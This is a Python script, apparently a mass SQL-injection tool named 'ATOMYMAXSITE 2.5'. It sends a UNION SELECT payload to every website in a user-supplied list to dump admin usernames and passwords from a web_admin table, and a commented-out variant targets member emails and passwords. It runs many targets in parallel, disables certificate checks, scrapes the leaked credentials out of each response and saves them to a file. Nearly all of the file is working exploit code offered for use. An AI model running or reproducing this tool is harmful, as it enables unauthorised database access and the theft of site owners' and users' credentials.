import requests
import re
import threading
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# output file
output = "result.txt"

# counter
count = 0

def banner():
    print('''
----------------------
ATOMYMAXSITE 2.5
auto sql injection
github.com/ceritarommy
----------------------
    ''')

def atomSqli(target):

    global output,count

    try:
        url = target
        # grab admin users
        payload = "index.php?name=page&file=page&op=.'union select 1,2,group_concat(username,0x3a,password),4,5,6,7,8,9,10 from web_admin--+-"

        # grab email & password member
        #payload = "index.php?name=page&file=page&op=.'union select 1,2,group_concat(email,0x3a,password),4,5,6,7,8,9,10 from web_member--+-"

        web_vuln = url.split("/")

        show_users = f"{url}{payload}"

        header = {"User-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"}
        request = requests.get(show_users, headers=header, verify=False, timeout=10)
        grab_users = re.findall('<FONT COLOR="#990000" size="2">(.*?)&nbsp;&nbsp;</b>', request.text)

        if grab_users[0] == "":
            pass
        else:
            count = count + 1
            result = f"[+] {web_vuln[2]} => {grab_users[0]}"
            save = open(output, "a")
            save.write(f"{result}\n")
            save.close()
            print(result)
    except:
        pass

banner()

list_file = input("Input your list: ")
read_file = open(list_file, "r")
threads = []

print("\n")

for target in read_file:

    target = target.strip()
    inject = threading.Thread(target=atomSqli, args=(target,))
    threads.append(inject)

for inject in threads:
    inject.start()

time.sleep(5)

for inject in threads:
    inject.join()

print(f"\nTotal website vuln: {count}\n")